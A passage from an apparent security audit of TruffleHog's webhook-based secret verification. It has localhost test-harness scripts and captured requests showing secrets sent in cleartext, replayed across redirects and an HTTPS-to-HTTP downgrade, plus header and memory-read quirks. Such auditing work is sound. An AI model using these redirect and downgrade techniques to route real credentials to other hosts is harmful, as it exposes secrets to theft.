verifier[0] (:52287) posts=1 -> REQUEST-LINE: POST /first HTTP/1.1
verifier[1] (:51271) posts=1 -> REQUEST-LINE: POST /second HTTP/1.1
(secret sent to BOTH endpoints; verified from the second's 200)

################ REDIRECT (HTTP 308) body replay to new destination ################
readiness: connect_ex=0 (listening)
readiness: connect_ex=0 (listening)
✅ Found verified result 🐷🔑
2026-07-13T18:52:37Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "7.048766ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":2}}
--- HOP1 (:52287 redirector) ---
SERVER-READY port=52287 status=308 redirect_to='http://127.0.0.1:51271/dest' log='/tmp/th_harness/ev2/redir_hop1.log' pid=117183
----- REQUEST #1 @ 2026-07-13T18:52:37 -----
REQUEST-LINE: POST /start HTTP/1.1
HEADER: Host: 127.0.0.1:52287
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
--- HOP2 (:51271 redirect target) — POST body + Authorization replayed? ---
SERVER-READY port=51271 status=200 redirect_to='' log='/tmp/th_harness/ev2/redir_hop2.log' pid=117180
----- REQUEST #1 @ 2026-07-13T18:52:37 -----
REQUEST-LINE: POST /dest HTTP/1.1
HEADER: Host: 127.0.0.1:51271
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Referer: http://127.0.0.1:52287/start
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----

################ successRanges NO-OP: 403 + successRanges:['403'] -> still Unverified ################
readiness: connect_ex=0 (listening)
Found unverified result 🐷🔑❓
2026-07-13T18:52:39Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "6.455249ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
server posts=1 (403 returned; successRanges:['403'] configured but IGNORED by code)
```

### 5.4 Interpretation (OBSERVED)

- **Linear below the cap:** 10 matches in one dense region → `SERVER_POSTS=10`.
- **Per-region cap at 100, stable:** 150 matches in one dense region → `SERVER_POSTS=100`, identical across two repeated runs (`n150_single_run1`, `n150_single_run2`). This is the `maxTotalMatches` clamp applied to a single region.
- **The cap is per keyword-match region, NOT per chunk (decisive):** a *single* file `split_60_60.txt` (8241 bytes < the 10 240-byte `ChunkSize`, so `chunks=1`) whose two 60-token clusters are separated by 2000 bytes of inert, keyword-free filler forms **two non-merging regions** and therefore issues `SERVER_POSTS=120` — i.e. **one chunk emitted 120 > 100 verifications**, stable across three fresh processes (`region_split_60_60`, `…_rerun`, and the standalone capture below whose `"chunks": 1 … "verified_secrets": 120` telemetry line is shown in full). The clamp applies to each region independently: `region_a130_b20` → `100` (region A of 130 clamped) `+ 20` (region B) `= 120`; the minimal over-cap case `region_a101_b1` → `100 + 1 = 101`; and the control `region_merged_120_ctrl` (120 tokens with **no** gap, hence a single merged region) → `100`. This is the decisive correction to the earlier "per chunk / scan-wide" framing.
- **Multi-chunk is additive too:** two 150-match files → `chunks=2`, `SERVER_POSTS=200`, confirming the bound is not scan-wide across chunks either.
- **Multi-verifier fan-out:** with two verifiers (`:…/first` returning 403, `:…/second` returning 200), the secret-bearing POST is delivered to **both** endpoints (`verifier[0] posts=1`, `verifier[1] posts=1`); verification succeeds from the second's 200. So one permutation can generate one request *per configured verifier* up to the first success.
- **Redirect fan-out:** an HTTP `308` at hop1 causes `net/http` to follow to hop2, producing a **second** request; the redirect interpretation (body + `Authorization` replayed to the new destination) is detailed in §6.4.

The `successRanges` sub-experiment in the same run is interpreted in §6.6.

---

## 6. Data exfiltration surface

**Direct answer:** The webhook receives an HTTP `POST` whose JSON body is `json.Marshal` of a nested map `{detectorName: {regexName: [fullMatch, captureGroup, …]}}` — i.e. the **matched secret material in cleartext** — plus the configured headers (with keys **canonicalized** and values **left-trimmed**, not byte-for-byte verbatim — §6.6) and a **default** `User-Agent: TruffleHog` that a configured `User-Agent` **overrides** (§6.6). `Host` and `Content-Length` are always **regenerated** by `net/http` from the URL and body, so configuring them has no effect (§6.6). The secret is sent **regardless of the response status** (200 *and* 403 both receive it). On a 200, the **entire** response body is read into memory with `io.ReadAll` [custom_detectors.go:253] and only *then* truncated to the first **200 bytes** for the result surfaced in the CLI as `Response:` — a bidirectional channel whose read is **unbounded in memory** (§6.8). Redirects replay the same secret-bearing body to new destinations, including an **HTTPS→HTTP cleartext downgrade** (§6.5).

### 6.1 Code path (what is serialized and attached)

**[SOURCE-DERIVED / INFERRED]**
- Body: `json.Marshal(map[string]map[string][]string{ c.GetName(): match })` [pkg/custom_detectors/custom_detectors.go:214-216]. The array's first element is the full regex match; subsequent elements are capture groups.
- Request: `http.NewRequestWithContext(ctx, "POST", endpoint, bytes.NewReader(body))` [custom_detectors.go:228] — always `POST`.
- Headers: split at the **first** colon with `strings.Cut(header, ":")` [custom_detectors.go:233] and added with the value left-trimmed of whitespace, `req.Header.Add(key, strings.TrimLeft(value, "\t\n\v\f\r "))` [custom_detectors.go:238].
- A **default** `User-Agent` is injected by the shared transport: `CustomTransport.RoundTrip` calls `req.Header.Add("User-Agent", UserAgent())` [pkg/common/http.go:100], where `UserAgent()` returns `"TruffleHog"` [pkg/common/http.go:92-97]. Because this is `Add` (not `Set`) and runs **after** the config headers are attached (:238), a config-supplied `User-Agent` occupies index 0 and Go writes only that first value — so a configured `User-Agent` **overrides** the default (§6.6). `Host` and `Content-Length` are regenerated by `net/http` (§6.6).
- Response readback (only on 200): `io.ReadAll` [custom_detectors.go:253], then `responseStr := string(body)` [custom_detectors.go:259] truncated to the first 200 **bytes** via `responseStr[:200]` [custom_detectors.go:260-263], stored as `result.ExtraData["response"]` [custom_detectors.go:266].

### 6.2 Scenario script (self-contained; sources `lib.sh` from §2.3)

```bash
# ---- scripts/02_datasurface.sh ----
#!/usr/bin/env bash
# Evidence: exact bytes egressed to the webhook on HTTP 200 and on HTTP 403
# (secret transmitted regardless of status), plus the 200-BYTE response readback.
source /tmp/th_harness/scripts/lib.sh
read P < <(pick_ports 1)
DATA="$TH/data_ds"; make_canon_data "$DATA"

mkcfg() {  # mkcfg FILE ENDPOINT
  cat > "$1" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: $2
        unsafe: true
        headers: ["$AUTH"]
CFG
}

echo "################ CASE 200: webhook returns 200 -> Verified ################"
L="$EV/ds_200.log"; start_server "$P" 200 "$L"
CFG="$TH/ds_200.yaml"; mkcfg "$CFG" "http://127.0.0.1:$P/"
echo "--- config ---"; cat "$CFG"
echo "--- CLI (grep to bounded result lines) ---"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update 2>&1 \
  | grep -E 'Found (verified|unverified) result|verified_secrets|unverified_secrets|Response:'
echo "TRUFFLEHOG_EXIT=${PIPESTATUS[0]}"
echo "--- server-captured request (COMPLETE, verbatim) ---"; cat "$L"
stop_all

echo ""
echo "################ CASE 403: webhook returns 403 -> Unverified, but secret STILL sent ################"
L="$EV/ds_403.log"; start_server "$P" 403 "$L"
CFG="$TH/ds_403.yaml"; mkcfg "$CFG" "http://127.0.0.1:$P/"
echo "--- CLI ---"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update 2>&1 \
  | grep -E 'Found (verified|unverified) result|verified_secrets|unverified_secrets'
echo "--- server-captured request on 403 (proves secret transmitted despite non-200) ---"; cat "$L"
stop_all

echo ""
echo "################ CASE readback: 200 with a 250-byte body -> CLI 'Response:' truncated to 200 BYTES ################"
BODY=$(python3 -c "print(''.join(str(i%10) for i in range(250)),end='')")
echo "server response body length = ${#BODY} bytes"
L="$EV/ds_readback.log"; start_server "$P" 200 "$L" "$BODY"
CFG="$TH/ds_readback.yaml"; mkcfg "$CFG" "http://127.0.0.1:$P/"
CLI="$EV/ds_readback_cli.out"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
echo "--- CLI Response line ---"; grep -m1 '^Response:' "$CLI"
RESP=$(grep -m1 '^Response:' "$CLI" | sed 's/^Response: //')
echo "rendered Response length = ${#RESP} bytes"
[ "$RESP" = "${BODY:0:200}" ] && echo "MATCH: CLI Response == first 200 bytes of server body (BYTE truncation confirmed)" \
                              || echo "NO MATCH"
stop_all
```

### 6.3 Complete, unedited output

```text
################ CASE 200: webhook returns 200 -> Verified ################
readiness: connect_ex=0 (listening)
--- config ---
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '[^A-Za-z0-9+\/]{0,1}([A-Za-z0-9+\/]{40})[^A-Za-z0-9+\/]{0,1}'
    verify:
      - endpoint: http://127.0.0.1:41071/
        unsafe: true
        headers: ["Authorization: super secret authorization header"]
--- CLI (grep to bounded result lines) ---
✅ Found verified result 🐷🔑
Response:
2026-07-13T18:50:44Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "5.807103ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
TRUFFLEHOG_EXIT=0
--- server-captured request (COMPLETE, verbatim) ---
SERVER-READY port=41071 status=200 redirect_to='' log='/tmp/th_harness/ev2/ds_200.log' pid=114681
----- REQUEST #1 @ 2026-07-13T18:50:44 -----
REQUEST-LINE: POST / HTTP/1.1
HEADER: Host: 127.0.0.1:41071
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----

################ CASE 403: webhook returns 403 -> Unverified, but secret STILL sent ################
readiness: connect_ex=0 (listening)
--- CLI ---
Found unverified result 🐷🔑❓
2026-07-13T18:50:46Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "7.454932ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1}}
--- server-captured request on 403 (proves secret transmitted despite non-200) ---
SERVER-READY port=41071 status=403 redirect_to='' log='/tmp/th_harness/ev2/ds_403.log' pid=114760
----- REQUEST #1 @ 2026-07-13T18:50:46 -----
REQUEST-LINE: POST / HTTP/1.1
HEADER: Host: 127.0.0.1:41071
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----

################ CASE readback: 200 with a 250-byte body -> CLI 'Response:' truncated to 200 BYTES ################
server response body length = 250 bytes
readiness: connect_ex=0 (listening)
--- CLI Response line ---
Response: 01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
rendered Response length = 200 bytes
MATCH: CLI Response == first 200 bytes of server body (BYTE truncation confirmed)
```

### 6.4 Interpretation (OBSERVED)

- **Exact on-the-wire body:** `{"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}`. Index 0 is the full match (including the leading space and trailing newline consumed by the regex's `[^A-Za-z0-9+\/]{0,1}` boundaries); index 1 is the 40-char capture group. `Content-Length: 121`.
- **Headers as received:** the configured `Authorization: super secret authorization header` (delivered unchanged in this example, though keys are canonicalized and values left-trimmed in general — §6.6), the **default** `User-Agent: TruffleHog` (overridable by a configured `User-Agent` — §6.6), and `Accept-Encoding: gzip` (added by the Go transport). No secret-redaction is applied to the body or headers.
- **Secret sent regardless of status (connection-stage nuance):** on the **403** case the server still logs the identical full request — the body is written *before* the response status is known, so a non-200 (or any post-write error) does **not** imply the secret was withheld. Whether the secret leaves the process depends on **where** in the exchange the failure occurs: a pre-write failure (e.g. the untrusted-TLS handshake in §4.2, 0 server requests) withholds it; a failure at or after the request write (403, or a read error after sending) does not. Blanket claims like "on any error the secret is not transmitted" are therefore incorrect.
- **Response readback is byte-truncated:** with a 250-byte response body, the CLI `Response:` line renders exactly **200 bytes** and byte-for-byte equals the first 200 bytes of the server body (`MATCH` line). The truncation unit is **bytes** (`responseStr[:200]`), not characters — a multi-byte UTF-8 rune straddling the boundary would be split. This makes verification a **bidirectional** channel: the endpoint not only receives the secret but can return up to 200 bytes that are recorded in the result's `ExtraData["response"]` and shown to the operator.

### 6.5 Redirects replay the secret-bearing body to new destinations

**[OBSERVED]** Because `createResults` sets no custom `CheckRedirect`, `net/http`'s default policy follows redirects, and for `307`/`308` it replays the original method and body (the request is built from a `*bytes.Reader`, so `GetBody` is populated — see §10, corroborated). The `05_amplification.sh` `308` sub-experiment (full CLI result in §5.3) produced these two **byte-exact server captures**. Hop 1 (the `308` redirector):

```text
SERVER-READY port=52287 status=308 redirect_to='http://127.0.0.1:51271/dest' log='/tmp/th_harness/ev2/redir_hop1.log' pid=117183
----- REQUEST #1 @ 2026-07-13T18:52:37 -----
REQUEST-LINE: POST /start HTTP/1.1
HEADER: Host: 127.0.0.1:52287
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
```

Hop 2 (the redirect target) — the same secret body and `Authorization` header are replayed to a **different** endpoint, with a `Referer` added:

```text
SERVER-READY port=51271 status=200 redirect_to='' log='/tmp/th_harness/ev2/redir_hop2.log' pid=117180
----- REQUEST #1 @ 2026-07-13T18:52:37 -----
REQUEST-LINE: POST /dest HTTP/1.1
HEADER: Host: 127.0.0.1:51271
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Referer: http://127.0.0.1:52287/start
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
```

Consequence: a config author (or anyone who can respond to the first hop) can bounce the secret-bearing POST to an arbitrary further destination; the `Referer: http://127.0.0.1:52287/start` header additionally leaks the original endpoint.

**HTTPS → HTTP downgrade (`307`): the secret is replayed in cleartext, with no `unsafe` re-check.** **[OBSERVED]** The redirect follow is not limited to same-scheme hops. Because the `unsafe`/`http://` gate is evaluated **only at config load** (`ValidateVerifyEndpoint`, called at [custom_detectors.go:50]) and there is **no** `CheckRedirect` on the shared client ([custom_detectors.go:62], `httpClient.Do` at [:240]), a config whose endpoint is `https://` (and therefore needs **no** `unsafe`) can still be bounced to a **cleartext** `http://` destination that receives the secret in the clear. The following scenario uses a **trusted-CA HTTPS** hop 1 that returns `307` with `Location: http://<hop2>`:

```bash
# ---- scripts/12_tls_downgrade.sh ----
#!/usr/bin/env bash
# Evidence: HTTPS->HTTP downgrade on redirect. The config endpoint is https://
# (no unsafe needed). Hop 1 is a TRUSTED-CA HTTPS server that returns 307 with
# Location: http://<hop2> (cleartext). Because createResults sets no CheckRedirect
# (httpClient=SaneHttpClient :62, Do :240), Go's default policy FOLLOWS the
# redirect and, for 307, REPLAYS method+body. The secret is thus re-sent to the
# http:// hop2 in CLEARTEXT with NO unsafe re-check (unsafe is only validated at
# load, :50). Final hop returns 200 -> result verified.
source /tmp/th_harness/scripts/lib.sh
CA=/tmp/th_harness/tls_ca
DATA="$TH/data_dg"; make_canon_data "$DATA"
read HOP1 HOP2 < <(pick_ports 2)

L1="$EV/dg_hop1_https.log"; L2="$EV/dg_hop2_http.log"
start_server "$HOP2" 200 "$L2" "" "" "" "" >/dev/null
start_server "$HOP1" 307 "$L1" "" "http://127.0.0.1:$HOP2/dest" "$CA/good-cert.pem" "$CA/good-key.pem" >/dev/null

CFG="$TH/downgrade.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: https://127.0.0.1:$HOP1/start
        headers: ["$AUTH"]
CFG
echo "--- config verify block (endpoint is HTTPS, NO unsafe key) ---"; sed -n '/verify:/,$p' "$CFG"
echo "--- hop1 = HTTPS(trusted CA) :$HOP1 returns 307 -> http://127.0.0.1:$HOP2/dest (cleartext) ---"
CLI="$EV/dg_cli.out"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 SSL_CERT_FILE="$CA/ca-cert.pem" \
  "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
echo "RESULT: $(grep -E 'Found (verified|unverified) result' "$CLI" | head -1)"
echo ""
echo "===== HOP 1 (HTTPS, encrypted) server-captured request ====="
sed -n '/^----- REQUEST #1/,/^----- END REQUEST #1/p' "$L1"
echo ""
echo "===== HOP 2 (HTTP, CLEARTEXT) server-captured request — secret replayed in the clear ====="
sed -n '/^----- REQUEST #1/,/^----- END REQUEST #1/p' "$L2"
stop_all >/dev/null 2>&1
```

Complete, unedited output:

```text
--- config verify block (endpoint is HTTPS, NO unsafe key) ---
    verify:
      - endpoint: https://127.0.0.1:41345/start
        headers: ["Authorization: super secret authorization header"]
--- hop1 = HTTPS(trusted CA) :41345 returns 307 -> http://127.0.0.1:48687/dest (cleartext) ---
RESULT: ✅ Found verified result 🐷🔑

===== HOP 1 (HTTPS, encrypted) server-captured request =====
----- REQUEST #1 @ 2026-07-14T01:56:33 -----
REQUEST-LINE: POST /start HTTP/1.1
HEADER: Host: 127.0.0.1:41345
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----

===== HOP 2 (HTTP, CLEARTEXT) server-captured request — secret replayed in the clear =====
----- REQUEST #1 @ 2026-07-14T01:56:33 -----
REQUEST-LINE: POST /dest HTTP/1.1
HEADER: Host: 127.0.0.1:48687
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
```

**What the capture shows (OBSERVED):** the config endpoint is `https://` with **no** `unsafe` key; hop 1 (HTTPS, trusted CA) receives the secret over TLS and returns `307`; hop 2 (**plaintext HTTP**) receives the identical secret body and `Authorization` header **in the clear**, and the scan reports `✅ Found verified result` (the final hop returned 200). The `unsafe` gate is never re-evaluated on the downgrade. Two nuances: (a) unlike the same-scheme `http→http` hop above, **no `Referer` is sent** to hop 2 — Go omits it on an `https→http` downgrade — but the secret body is replayed regardless; (b) the `Authorization` header survives here because both hops share the host `127.0.0.1`; Go strips `Authorization` on redirects to a *different* host, though the JSON secret **body** is replayed even then. The security consequence is that selecting `https://` does **not** guarantee the secret stays encrypted end-to-end: any party controlling the endpoint's responses can force a cleartext replay.

### 6.6 Header semantics — not free-form verbatim

**[OBSERVED + SOURCE-DERIVED]** Configured headers are split at the **first** colon (`strings.Cut`, [custom_detectors.go:233]) and their value is **left-trimmed** of whitespace ([custom_detectors.go:238]); `net/http` then **canonicalizes** header keys and validates them. So the byte-for-byte fidelity claim holds only for the *captured example*, not arbitrary strings. Scenario script:

```bash
# ---- scripts/06_headers.sh ----
#!/usr/bin/env bash
# Evidence: header handling — strings.Cut at FIRST colon (custom_detectors.go:233),
# TrimLeft of leading value whitespace (:238), net/http canonicalization of keys,
# duplicates preserved, and malformed (no-colon) headers REJECTED at config load
# (validation.go:46-53).
source /tmp/th_harness/scripts/lib.sh
read P < <(pick_ports 1)
DATA="$TH/data_hdr"; make_canon_data "$DATA"

echo "################ HEADER SEMANTICS (trim / first-colon / colon-in-value / duplicate / canonicalization) ################"
L="$EV/headers.log"; start_server "$P" 200 "$L"
CFG="$TH/headers.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$P/
        unsafe: true
        headers:
          - "Authorization:      super secret authorization header"
          - "x-lower-canon: canonicalized"
          - "X-Colon-Value: http://inner:8080/path"
          - "X-Dup: one"
          - "X-Dup: two"
CFG
echo "--- config headers block ---"; sed -n '/headers:/,$p' "$CFG"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update >/dev/null 2>&1
echo "--- headers as received by server (verbatim) ---"; grep '^HEADER:' "$L"
stop_all

echo ""
echo "################ MALFORMED HEADER (no colon) -> REJECTED at config load ################"
CFGBAD="$TH/headers_bad.yaml"
cat > "$CFGBAD" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$P/
        unsafe: true
        headers: ["ThisHeaderHasNoColon"]
CFG
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFGBAD" --no-update 2>&1 \
  | grep -iE 'error parsing|colon' | head -3
```

Complete, unedited output:

```text
################ HEADER SEMANTICS (trim / first-colon / colon-in-value / duplicate / canonicalization) ################
readiness: connect_ex=0 (listening)
--- config headers block ---
        headers:
          - "Authorization:      super secret authorization header"
          - "x-lower-canon: canonicalized"
          - "X-Colon-Value: http://inner:8080/path"
          - "X-Dup: one"
          - "X-Dup: two"
--- headers as received by server (verbatim) ---
HEADER: Host: 127.0.0.1:46301
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: X-Colon-Value: http://inner:8080/path
HEADER: X-Dup: one
HEADER: X-Dup: two
HEADER: X-Lower-Canon: canonicalized
HEADER: Accept-Encoding: gzip

################ MALFORMED HEADER (no colon) -> REJECTED at config load ################
2026-07-13T18:52:55Z	error	trufflehog	error parsing the provided configuration file	{"error": "header \"ThisHeaderHasNoColon\" must contain a colon"}
```

Interpretation (OBSERVED): the `Authorization` value's leading run of spaces is **trimmed** (`super secret…`, no leading spaces at the server); `x-lower-canon` is **canonicalized** to `X-Lower-Canon`; `X-Colon-Value: http://inner:8080/path` keeps every colon **after** the first (first-colon split preserves value colons); the two `X-Dup` headers are **both** delivered; and a header with **no colon** is **rejected at config load** (`header "ThisHeaderHasNoColon" must contain a colon`, from `ValidateVerifyHeaders` [pkg/custom_detectors/validation.go:46-53]).

**Special headers: `User-Agent` is an overridable default; `Host`/`Content-Length` are regenerated. [OBSERVED]** The `User-Agent` is **not** fixed. The transport adds it with `req.Header.Add("User-Agent", UserAgent())` [common/http.go:100] (where `UserAgent()` returns `"TruffleHog"` [common/http.go:92-97]) *after* the config headers are attached (:238), and `net/http` serializes only the **first** `User-Agent` value; so a config-supplied `User-Agent` (index 0) wins and the default is not sent. `Host` and `Content-Length` are computed by `net/http` from the request URL and body and cannot be set through the headers list. This scenario configures each in turn:

```bash
# ---- scripts/13_headers_special.sh ----
#!/usr/bin/env bash
# Evidence: injected default User-Agent (common/http.go:100, via Add after the
# config headers at custom_detectors.go:238) is OVERRIDDEN by a configured
# User-Agent; Host and Content-Length are REGENERATED by net/http. Canonical
# --config path; three sub-cases share the HogTokenDetector shell.
source /tmp/th_harness/scripts/lib.sh
DATA="$TH/data_hs"; make_canon_data "$DATA"

run_case() {  # run_case LABEL  (headers YAML lines on stdin, indented 10 spaces)
  local label="$1"
  read P < <(pick_ports 1)
  local L="$EV/hs_${label}.log"; start_server "$P" 200 "$L" >/dev/null
  local CFG="$TH/hs_${label}.yaml"
  {
    echo "detectors:"
    echo "  - name: HogTokenDetector"
    echo "    keywords: [hog]"
    echo "    regex:"
    echo "      token: '$REGEX'"
    echo "    verify:"
    echo "      - endpoint: http://127.0.0.1:$P/"
    echo "        unsafe: true"
    echo "        headers:"
    cat
  } > "$CFG"
  echo "################ $label ################"
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update >/dev/null 2>&1
  grep -E '^HEADER: (User-Agent|Host|Content-Length|Authorization):' "$L" | sort
  stop_all >/dev/null 2>&1
  echo ""
}

run_case "A_baseline_no_UA" <<'HDR'
          - "Authorization: super secret authorization header"
HDR
run_case "B_configured_UA_overrides" <<'HDR'
          - "Authorization: super secret authorization header"
          - "User-Agent: custom-agent/9.9"
HDR
run_case "C_host_and_contentlength_regenerated" <<'HDR'
          - "Authorization: super secret authorization header"
          - "Host: evil.example.com"
          - "Content-Length: 99999"
HDR
```

Complete, unedited output:

```text
################ A_baseline_no_UA ################
HEADER: Authorization: super secret authorization header
HEADER: Content-Length: 121
HEADER: Host: 127.0.0.1:51605
HEADER: User-Agent: TruffleHog

################ B_configured_UA_overrides ################
HEADER: Authorization: super secret authorization header
HEADER: Content-Length: 121
HEADER: Host: 127.0.0.1:54559
HEADER: User-Agent: custom-agent/9.9

################ C_host_and_contentlength_regenerated ################
HEADER: Authorization: super secret authorization header
HEADER: Content-Length: 121
HEADER: Host: 127.0.0.1:40955
HEADER: User-Agent: TruffleHog
```

Interpretation (OBSERVED): case **A** (no `User-Agent` configured) sends the default `User-Agent: TruffleHog`. Case **B** configures `User-Agent: custom-agent/9.9` and the wire shows **only** that value — the default `TruffleHog` is **absent**, so a configured `User-Agent` **overrides** the injected default. Case **C** configures `Host: evil.example.com` and `Content-Length: 99999`, yet the wire shows `Host: 127.0.0.1:<port>` and `Content-Length: 121` — both **regenerated** by `net/http`, the configured values ignored. This is why the earlier "verbatim headers / fixed `User-Agent`" phrasing is imprecise and has been corrected.

### 6.7 `successRanges` is a no-op at this commit

**[OBSERVED + SOURCE-DERIVED]** The proto exposes a `successRanges` field [proto/custom_detectors.proto] and the YAML key `successRanges` is accepted at load, but `createResults` only ever tests `resp.StatusCode == http.StatusOK` (200) [custom_detectors.go:249] — it never consults `successRanges`. The corresponding validator `ValidateVerifyRanges` [pkg/custom_detectors/validation.go:55-97] is not called by `NewWebhookCustomRegex`, so the field is effectively dead at this commit. In the `05_amplification.sh` run (full CLI result in §5.3), a `403` endpoint configured with `successRanges: ["403"]` still yields `verified_secrets: 0` / `Found unverified result`. The server nonetheless received the request (byte-exact capture):

```text
SERVER-READY port=52287 status=403 redirect_to='' log='/tmp/th_harness/ev2/successranges.log' pid=117259
----- REQUEST #1 @ 2026-07-13T18:52:39 -----
REQUEST-LINE: POST /only HTTP/1.1
HEADER: Host: 127.0.0.1:52287
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
```

### 6.8 Unbounded response read — a hostile 200 body inflates scanner memory

**[OBSERVED]** On a `200`, `createResults` reads the **entire** response body into memory with `body, err := io.ReadAll(resp.Body)` [custom_detectors.go:253], converts it with `responseStr := string(body)` [custom_detectors.go:259] (a second full copy), and **only then** truncates the retained value to 200 bytes [custom_detectors.go:261-262]. There is no `io.LimitReader` and no size cap on the read; the sole implicit bound is the 5-second client timeout [common/http.go:209], which over a fast link permits very large transfers. So an endpoint the config author controls can return a large `200` body and force the scanner to allocate it, even though just 200 bytes are kept.

Two small helpers make the measurement self-contained — a streaming large-body server (so the *server* never holds the whole body) and a peak-RSS launcher (`os.wait4` `ru_maxrss`, in KB on Linux; the environment has no GNU `/usr/bin/time`):

```python
# ---- bigserver.py (returns HTTP 200 with a TH_BIGN-byte body, streamed in 1 MiB chunks) ----
import http.server, os, sys, threading
PORT = int(os.environ["TH_PORT"]); BIGN = int(os.environ.get("TH_BIGN", "0")); CHUNK = 1024*1024
_lock = threading.RLock(); _n = 0
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _handle(self):
        global _n
        with _lock:
            _n += 1; n = _n
